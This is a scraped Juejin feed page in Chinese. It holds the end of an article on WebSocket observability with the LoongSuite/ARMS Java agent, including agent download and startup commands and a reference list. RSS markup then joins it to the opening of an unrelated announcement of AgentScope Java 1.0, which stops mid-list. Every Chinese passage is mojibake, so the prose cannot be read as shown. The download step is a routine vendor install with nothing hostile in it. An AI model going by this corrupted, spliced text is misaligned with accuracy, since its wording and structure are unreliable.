<p>åœ¨æœ¬ç¤ºä¾‹é¡¹ç›®ä¸­ï¼Œé¢„ç•™äº†æ¢é’ˆæŒ‚è½½çš„ç¯å¢ƒå˜é‡ï¼Œé€šè¿‡æŒ‚è½½ LoongSuite æ¢é’ˆï¼Œæˆ‘ä»¬å¯ä»¥å°† ASR demo æœåŠ¡çš„å¯è§‚æµ‹æ•°æ®æ¥å…¥åˆ° ARMS æ§åˆ¶å°ã€‚ä»¥ä¸‹æ˜¯å…·ä½“æ­¥éª¤ï¼š</p>
<ol>
<li>ä¸‹è½½ LoongSuite å•†ä¸šåŒ–æ¢é’ˆå¹¶è§£å‹</li>
</ol>
<blockquote>
<p>ä¸ºä¿è¯ LLM é“¾è·¯çš„å®Œæ•´æ€§ï¼Œå»ºè®®ä¸‹è½½ 4.6.0 åŠæ›´é«˜ç‰ˆæœ¬æ¢é’ˆã€‚</p>
</blockquote>
<pre><code class="hljs language-python" lang="python">wgetÂ <span class="hljs-string">"http://arms-apm-cn-hangzhou.oss-cn-hangzhou.aliyuncs.com/4.6.0/AliyunJavaAgent.zip"</span>Â -O AliyunJavaAgent.<span class="hljs-built_in">zip</span>
unzip AliyunJavaAgent.<span class="hljs-built_in">zip</span>
</code></pre>
<p>2.  å‚ç…§ READMEï¼Œåœ¨å¯åŠ¨åº”ç”¨æ—¶æ·»åŠ æ¢é’ˆæŒ‚è½½ç›¸å…³å‚æ•°ï¼Œç›¸å…³å‚æ•°å¯ä»¥å‚è€ƒæ‰‹åŠ¨å®‰è£…æ¢é’ˆ <strong>[1****1]</strong> æ–‡æ¡£è·å–ã€‚</p>

<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span>Â JAVA_AGENT_OPTIONS=<span class="hljs-string">"-javaagent:/path/to/4.6.0/AliyunJavaAgent/aliyun-java-agent.jar -Darms.licenseKey=<span class="hljs-variable">${your_license_key}</span>Â -Darms.appName=websocket-demo -Daliyun.javaagent.regionId=cn-hangzhou -Darms.workspace=<span class="hljs-variable">${your_cms_workspace}</span>"</span>
./start.sh
</code></pre>
<p>ä½ ä¹Ÿå¯ä»¥æ¥å…¥ LoongSuite å¼€æºç‰ˆæœ¬æ¢é’ˆæˆ–è€… OpenTelemetry æ¢é’ˆï¼Œå¹¶å¯è§‚æµ‹æ•°æ®ä¸ŠæŠ¥åˆ°å¼€æºçš„å¯è§‚æµ‹å¹³å°ï¼Œå—é™äºç¯‡å¹…ï¼Œåœ¨æ­¤ä¸å†å±•å¼€ï¼Œæ¬¢è¿ç§»æ­¥Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falibaba%2Floongsuite-java-agent%25C2%25A0%25E8%258E%25B7%25E5%258F%2596%25E6%259B%25B4%25E5%25A4%259A%25E4%25BF%25A1%25E6%2581%25AF%25E3%2580%2582" target="_blank" title="https://github.com/alibaba/loongsuite-java-agent%C2%A0%E8%8E%B7%E5%8F%96%E6%9B%B4%E5%A4%9A%E4%BF%A1%E6%81%AF%E3%80%82" ref="nofollow noopener noreferrer">github.com/alibaba/looâ€¦</a></p>
<h3 data-id="heading-29">4.3 ç³»ç»Ÿé¡µé¢ä¸å¯è§‚æµ‹æ•ˆæœç¤ºæ„</h3>
<p>ä»¥ä¸‹æ˜¯éƒ¨ç½²åçš„åº”ç”¨ç³»ç»Ÿé¡µé¢ï¼Œç±»ä¼¼ç°åœ¨çš„æ™ºèƒ½æœºå™¨äºº IM ç³»ç»Ÿï¼Œç”¨äºæ›¿ä»£è®¾å¤‡ç«¯çš„å·¦å³ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2457aea5acd3462ab61a2d4077a53634~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=eWkO7fbQjUwnAOzEyuitlK9thLQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨å‘èµ·å¯¹è¯åï¼Œç»Ÿè®¡ä¸Šæ¥çš„é“¾è·¯å¦‚å›¾æ‰€ç¤ºã€‚å¯ä»¥åœ¨ä¸€æ¡é“¾è·¯ä¸­æ¸…æ™°çœ‹åˆ°æ¯ä¸ªç¯èŠ‚çš„æŒç»­æ—¶é—´ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d467b4c5bd743509e58891c4fd82f21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=qNy8DKKAQVSBUKu%2BqlkWgPlqfKA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨ WebSocket å¯¹åº” span ä¸­ï¼Œèƒ½å¤Ÿçœ‹åˆ°ç»Ÿè®¡åˆ°çš„é¦–åŒ…å»¶è¿Ÿä¸å¹³å‡è¾“å‡ºé—´éš”ç­‰æŒ‡æ ‡ï¼Œå¸®åŠ©åˆ†ææ•´ä½“ä¸šåŠ¡æ€§èƒ½ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58bdf4fa4b1144abb890919506bf80c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=y6FtHNwt%2ByaP4qV6XmhmttVbafw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-30">ç»“è¯­ï¼šæœªæ¥å±•æœ›</h2>
<p>WebSocket é¢†åŸŸçš„å…¨é“¾è·¯å¯è§‚æµ‹æ€§ä¸€ç›´ä»¥æ¥éƒ½æ˜¯è®©è®¸å¤šä¼ä¸šå¼€å‘å’Œè¿ç»´äººå‘˜å¤´ç—›çš„é—®é¢˜ã€‚å¯è§‚æµ‹æ€§çš„è§£å†³æ–¹æ¡ˆå¹¶ä¸èƒ½ä¸€è¹´è€Œå°±ï¼Œéœ€è¦ä¸ç”¨æˆ·è¿›è¡ŒæŒç»­æ·±åº¦å…±å»ºä¸é…åˆã€‚å¾ˆå…´å¥‹èƒ½çœ‹åˆ°å…¬ç‰›åœ¨ä¸å¯è§‚æµ‹å›¢é˜Ÿå…±åŒå®Œæˆäº†è¯¥æ–¹æ¡ˆåœ¨ç”Ÿäº§ä¸Šçš„å®é™…è½åœ° <strong>[</strong> <strong>12]</strong> ï¼Œä¹Ÿä¸ºæˆ‘ä»¬æ–¹æ¡ˆçš„å®Œå–„æä¾›äº†éå¸¸å®è´µçš„ç»éªŒã€‚æœªæ¥æˆ‘ä»¬å°†ä¸æ›´å¤šçš„ç”¨æˆ·ä¸å¼€æºå¼€å‘è€…å…±å»ºï¼ŒæŒç»­è¡¥å……å’Œå»ºè®¾æ›´å®Œå–„ã€æ›´æ˜“ç”¨çš„ WebSocket å¯è§‚æµ‹æ–¹æ¡ˆã€‚</p>
<p>æ¬¢è¿å¤§å®¶å…³æ³¨ LoongSuite ç¤¾åŒºï¼Œä»¥è·å–ç›¸å…³æ–¹æ¡ˆçš„æœ€æ–°è¿›å±•ï¼š</p>
<p>â€œLoongCollector(åŸiLogtail)ç¤¾åŒºâ€é’‰é’‰ç¾¤å·ï¼š 35576244</p>
<p>â€œLoongSuite Go Agentå¼€æºäº¤æµç¾¤â€é’‰é’‰ç¾¤å·ï¼š 102565007776</p>
<p>â€œLoongSuite Python SIGâ€é’‰é’‰ç¾¤å·ï¼š 101925034286</p>
<p>â€œLoongSuite Python SIGâ€é’‰é’‰ç¾¤å·ï¼š 101925034286</p>
<p><strong>å‚è€ƒæ–‡ç« ï¼š</strong></p>
<p>[1] RFC 6455</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdatatracker.ietf.org%2Fdoc%2Fhtml%2Frfc6455" target="_blank" title="https://datatracker.ietf.org/doc/html/rfc6455" ref="nofollow noopener noreferrer">datatracker.ietf.org/doc/html/rfâ€¦</a></p>
<p>[2] The Road to WebSockets</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebsocket.org%2Fguides%2Froad-to-websockets%2F" target="_blank" title="https://websocket.org/guides/road-to-websockets/" ref="nofollow noopener noreferrer">websocket.org/guides/roadâ€¦</a></p>
<p>[3] WebSocket Protocol</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebsocket.org%2Fguides%2Fwebsocket-protocol%2F" target="_blank" title="https://websocket.org/guides/websocket-protocol/" ref="nofollow noopener noreferrer">websocket.org/guides/websâ€¦</a></p>
<p>[4] OpenAI Realtime API</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.openai.com%2Fdocs%2Fguides%2Frealtime-websocket" target="_blank" title="https://platform.openai.com/docs/guides/realtime-websocket" ref="nofollow noopener noreferrer">platform.openai.com/docs/guidesâ€¦</a></p>
<p>[5]Â å®æ—¶å¤šæ¨¡æ€äº¤äº’åè®®ï¼ˆWebSocketï¼‰</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Fmodel-studio%2Fmultimodal-interaction-protocol" target="_blank" title="https://help.aliyun.com/zh/model-studio/multimodal-interaction-protocol" ref="nofollow noopener noreferrer">help.aliyun.com/zh/model-stâ€¦</a></p>
<p>[6] Live API - WebSockets API reference</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fai.google.dev%2Fapi%2Flive" target="_blank" title="https://ai.google.dev/api/live" ref="nofollow noopener noreferrer">ai.google.dev/api/live</a></p>
<p>[7] Trace Context</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.w3.org%2FTR%2Ftrace-context%2F%23abstract" target="_blank" title="https://www.w3.org/TR/trace-context/#abstract" ref="nofollow noopener noreferrer">www.w3.org/TR/trace-coâ€¦</a></p>
<p>[8]Â Distributed Tracing åŸºæœ¬ä»‹ç»</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fobservability.cn%2Fproject%2Fopentelemetry%2Frp8k7gzvtys07zsb%2F" target="_blank" title="https://observability.cn/project/opentelemetry/rp8k7gzvtys07zsb/" ref="nofollow noopener noreferrer">observability.cn/project/opeâ€¦</a></p>
<p>[9]Â é€šè¿‡OpenTelemetry Java SDKä¸ºè°ƒç”¨é“¾å¢åŠ è‡ªå®šä¹‰åŸ‹ç‚¹</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Farms%2Fapplication-monitoring%2Fuse-cases%2Fuse-opentelemetry-sdk-for-java-to-manually-instrument-applications%3Fspm%3Da2c4g.11186623.help-menu-search-34364.d_5" target="_blank" title="https://help.aliyun.com/zh/arms/application-monitoring/use-cases/use-opentelemetry-sdk-for-java-to-manually-instrument-applications?spm=a2c4g.11186623.help-menu-search-34364.d_5" ref="nofollow noopener noreferrer">help.aliyun.com/zh/arms/appâ€¦</a></p>
<p>[10] OpenTelemetry Specification Overview</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fopentelemetry.io%2Fdocs%2Fspecs%2Fotel%2Foverview%2F" target="_blank" title="https://opentelemetry.io/docs/specs/otel/overview/" ref="nofollow noopener noreferrer">opentelemetry.io/docs/specs/â€¦</a></p>
<p>[11] æ‰‹åŠ¨å®‰è£…æ¢é’ˆ</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Farms%2Fapplication-monitoring%2Fuser-guide%2Fmanually-install-arms-agent-for-java-applications" target="_blank" title="https://help.aliyun.com/zh/arms/application-monitoring/user-guide/manually-install-arms-agent-for-java-applications" ref="nofollow noopener noreferrer">help.aliyun.com/zh/arms/appâ€¦</a></p>
<p>[12] ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247577965%26idx%3D2%26sn%3D842338decd2e1d6886f9f7c77b0e68fc%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247577965&amp;idx=2&amp;sn=842338decd2e1d6886f9f7c77b0e68fc&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">è®©æ¯æ¬¡è¯­éŸ³å”¤é†’éƒ½å¯é ï¼Œå…¬ç‰›æ²å…‰é‡æ„å¯è§‚æµ‹ä½“ç³»</a>ã€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AgentScope Java 1.0ï¼šä»æ¨¡å‹åˆ°åº”ç”¨ï¼ŒAI Agent å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†åˆ©å™¨ï¼]]></title>    <link>https://juejin.cn/post/7583910637957611539</link>    <guid>https://juejin.cn/post/7583910637957611539</guid>    <pubDate>2025-12-15T09:46:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583910637957611539" data-draft-id="7583615094363815990" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AgentScope Java 1.0ï¼šä»æ¨¡å‹åˆ°åº”ç”¨ï¼ŒAI Agent å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†åˆ©å™¨ï¼"/> <meta itemprop="keywords" content="Java,äº‘åŸç”Ÿ"/> <meta itemprop="datePublished" content="2025-12-15T09:46:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘äº‘åŸç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AgentScope Java 1.0ï¼šä»æ¨¡å‹åˆ°åº”ç”¨ï¼ŒAI Agent å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†åˆ©å™¨ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘äº‘åŸç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:46:44.000Z" title="Mon Dec 15 2025 09:46:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šäº¦ç›</p>
<h2 data-id="heading-0">AgentScope ç®€ä»‹</h2>
<p>AgentScope æ˜¯é˜¿é‡Œå·´å·´æ¨å‡ºçš„ä¸€æ¬¾ä»¥å¼€å‘è€…ä¸ºæ ¸å¿ƒï¼Œä¸“æ³¨äºæ™ºèƒ½ä½“å¼€å‘çš„å¼€æºæ¡†æ¶ï¼Œæ˜¯ç»§ ModelScopeï¼ˆé­”æ­ç¤¾åŒºï¼‰ååœ¨ Agent å±‚çš„æˆ˜ç•¥äº§å“ã€‚å®ƒçš„æ ¸å¿ƒç›®æ ‡æ˜¯è§£å†³æ™ºèƒ½ä½“åœ¨æ„å»ºã€è¿è¡Œå’Œç®¡ç†ä¸­çš„éš¾é¢˜ï¼Œæä¾›ä¸€å¥—è¦†ç›–â€œå¼€å‘ã€éƒ¨ç½²ã€è°ƒä¼˜â€å…¨ç”Ÿå‘½å‘¨æœŸçš„ç”Ÿäº§çº§è§£å†³æ–¹æ¡ˆï¼Œè®©æ™ºèƒ½ä½“åº”ç”¨çš„å¼€å‘æ›´ç®€å•ã€è¿è¡Œæ›´ç¨³å®šã€æ•ˆæœæ›´å“è¶Šã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c118a37647241b1893e0e5747440f79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766396803&amp;x-signature=Nc2fHBcTJPl7TPLyvyAIXGwQRE4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>è¿‘æœŸ AgentScope è¿æ¥äº† 12 æœˆç‰ˆæœ¬çš„é‡å¤§æ›´æ–°</strong>ï¼Œè¿™æ˜¯ä¸€æ¬¡é¢å‘ç”Ÿäº§çº§æ™ºèƒ½ä½“åº”ç”¨çš„åŸºå»ºå¤§å‡çº§ï¼Œè®©æ™ºèƒ½ä½“ä»â€œå®éªŒå®¤åŸå‹â€èµ°å‘â€œä¸šåŠ¡è½åœ°â€ã€‚<strong>æœ¬æ¬¡æ›´æ–°å›´ç»•ä¸‰å¤§æ ¸å¿ƒä¸»çº¿ï¼š</strong> å¼€ç®±å³ç”¨çš„æ™ºèƒ½ä½“ï¼Œå³åˆ»èµ‹èƒ½å¤šç§çœŸå®åœºæ™¯ï¼›åŸºå»ºå¢å¼ºè®©æ™ºèƒ½ä½“â€œå˜èªæ˜â€çš„åº•å±‚èƒ½åŠ›å…¨é¢å‡çº§ï¼›è¿è¡Œæ—¶ Ã— å¤šè¯­è¨€ Ã— å‰ç«¯ï¼Œä¸‰ä½ä¸€ä½“äº¤ä»˜ç”Ÿäº§å°±ç»ªçš„æ™ºèƒ½ä½“ã€‚</p>
<p>ä¸€ç›´ä»¥æ¥ï¼ŒJava è¯­è¨€åœ¨é‡‘èã€æ”¿åŠ¡ã€ç”µå•†ç­‰é¢†åŸŸå¼€å‘ä¸­éƒ½å ç€ä¸»å¯¼åœ°ä½ï¼Œå¼€å‘è€…ç¤¾åŒºå¯¹äº AgentScope Java ç‰ˆæœ¬çš„å‘¼å£°ä¹Ÿéå¸¸é«˜ï¼ŒAgentScope æœ¬æ¬¡ä¹Ÿé‡ç£…å‘å¸ƒäº† Java çš„ 1.0 ç‰ˆæœ¬ï¼Œæ‹¥æŠ±ä¼ä¸šå¼€å‘ä¸»æµæŠ€æœ¯æ ˆã€‚</p>
<h2 data-id="heading-1">AgentScope Java 1.0 é‡ç£…å‘å¸ƒ</h2>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å¾ˆé«˜å…´åœ°å®£å¸ƒ AgentScope Java 1.0 ç‰ˆæœ¬æ­£å¼å‘å¸ƒäº†ï¼Œé¢å‘ Java å¼€å‘è€…æä¾›ä¼ä¸šçº§ Agentic åº”ç”¨æ„å»ºçš„èƒ½åŠ›ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/baa988a8c2bb49048d8340894e4f4527~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766396803&amp;x-signature=wUxY2bFxf92eRxIpEWm9EDhl3dg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>é¦–å…ˆåœ¨å¼€å‘èŒƒå¼ä¸Šï¼Œ</strong>Â AgentScopeÂ é‡‡ç”¨é¢†å…ˆçš„ ReActï¼ˆæ¨ç†-è¡ŒåŠ¨ï¼‰æ¨¡å¼ï¼Œæ”¯æŒé«˜æ•ˆçš„å·¥å…·è°ƒç”¨ï¼Œå¹¶å…è®¸å¼€å‘è€…å¯¹ Agent æ‰§è¡Œè¿‡ç¨‹è¿›è¡Œå®æ—¶ä»‹å…¥ï¼Œå®ç°äº†è‡ªä¸»æ€§ä¸å¯æ§æ€§çš„å®Œç¾å¹³è¡¡ã€‚</p>
<p><strong>å…¶æ¬¡ï¼Œå®ƒæä¾›äº†å¼€ç®±å³ç”¨çš„ä¼ä¸šçº§èƒ½åŠ›ã€‚</strong> æ¡†æ¶æä¾›å®‰å…¨æ²™ç®±ä¿éšœä»£ç æ‰§è¡Œå®‰å…¨ï¼Œé€šè¿‡ç²¾ç»†çš„ä¸Šä¸‹æ–‡å·¥ç¨‹ä¼˜åŒ–æ¨¡å‹äº¤äº’æ•ˆæœã€‚ä½œä¸º Java æ¡†æ¶ï¼Œå®ƒæ˜“äºé›†æˆåˆ°ç°æœ‰ä¼ä¸šæŠ€æœ¯æ ˆä¸­ï¼Œå¹¶å…·å¤‡é«˜æ€§èƒ½æ¶æ„ï¼Œç¡®ä¿ç”Ÿäº§ç¯å¢ƒçš„ç¨³å®šå¯é ã€‚</p>
<p><strong>æœ€åï¼Œå®ƒæ‹¥æœ‰å®Œå–„çš„å¼€å‘ä¸ä¼˜åŒ–ç”Ÿæ€ã€‚</strong> æä¾›ä»å¼€å‘æ€å¯è§†åŒ–è°ƒè¯•ã€A/B æµ‹è¯•åˆ°è¯„ä¼°ä¸å¼ºåŒ–å­¦ä¹ çš„å®Œæ•´å·¥å…·é“¾ï¼Œæ„æˆäº† Agent å¼€å‘ã€éƒ¨ç½²ã€è°ƒä¼˜çš„é—­ç¯ï¼ŒåŠ©åŠ›æŒç»­æå‡ Agent æ•ˆæœã€‚</p>
<h3 data-id="heading-2">é¢†å…ˆçš„å¼€å‘èŒƒå¼</h3>
<p>åœ¨æ„å»ºå¤æ‚çš„ AI Agent åº”ç”¨æ—¶ï¼Œå¼€å‘è€…æ™®éé¢ä¸´ä¼—å¤šæŒ‘æˆ˜ï¼šåƒµåŒ–çš„å·¥ä½œæµéš¾ä»¥é€‚åº”å¤šå˜çš„ä»»åŠ¡ã€è¿è¡Œä¸­çš„Agent æ— æ³•å®æ—¶å¹²é¢„ã€æµ·é‡å·¥å…·å¯¼è‡´ç®¡ç†æ··ä¹±ä¸æ€§èƒ½ç“¶é¢ˆã€æ¨¡å‹è¾“å‡ºæ ¼å¼ä¸ç¨³å®šç­‰ç­‰ã€‚å¦‚ä½•ç³»ç»Ÿæ€§åœ°è§£å†³è¿™äº›ç—›ç‚¹ï¼Œæ˜¯æå‡å¼€å‘æ•ˆç‡å’Œåº”ç”¨ç¨³å®šæ€§çš„å…³é”®ã€‚AgentScope é‡‡ç”¨é¢†å…ˆçš„ ReAct èŒƒå¼ï¼Œèµ‹äºˆ LLM è‡ªä¸»è§„åˆ’èƒ½åŠ›ï¼Œå¹¶æä¾›å®æ—¶ä»‹å…¥æ§åˆ¶ã€é«˜æ•ˆçš„å·¥å…·è°ƒç”¨ä½“ç³»ã€‚æ­¤å¤–ï¼Œå®ƒè¿˜å†…ç½®ä»»åŠ¡è§„åˆ’ã€ç»“æ„åŒ–è¾“å‡ºç­‰å¼ºå¤§å·¥å…·ï¼Œæ”¯æŒé«˜æ•ˆå¼€å‘ç”Ÿäº§çº§åº”ç”¨ã€‚</p>
<ol>
<li>
<p><strong>é¢†å…ˆçš„ ReAct èŒƒå¼</strong>ï¼Œèµ‹äºˆAgentè‡ªä¸»è§„åˆ’èƒ½åŠ›ã€‚</p>
<ol>
